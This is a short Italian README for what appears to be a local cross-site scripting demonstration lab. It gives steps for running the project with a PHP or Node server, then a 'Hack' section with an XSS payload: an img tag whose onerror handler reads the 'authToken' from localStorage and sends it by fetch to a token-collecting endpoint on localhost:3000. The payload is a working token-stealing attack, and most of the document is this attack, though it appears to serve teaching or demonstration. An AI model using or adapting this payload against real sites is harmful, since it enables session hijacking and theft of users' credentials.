Run ambiente
- Go live del progetto principlae (index.html)
- Prova con PHP: entrare nella cartella server_php e lanciare il server con `php -S localhost:8000`
- Prova con node: entrare nella cartella server_node:
    - lanciare `npm install` la prima volta
    - lanciare il server con `node server.js`

Hack
In base al server in esecuzione modificare il seguente payload
<img src="x" onerror="const authToken = localStorage.getItem('authToken');const url = `http://localhost:3000/saveToken?authToken=${encodeURIComponent(authToken)}`;fetch(url).then(response => {if (response.ok) {console.log('Token inviato con successo!');} else {console.error('Errore durante l\'invio del token');}}).catch(error => console.error('Errore di rete:', error));">
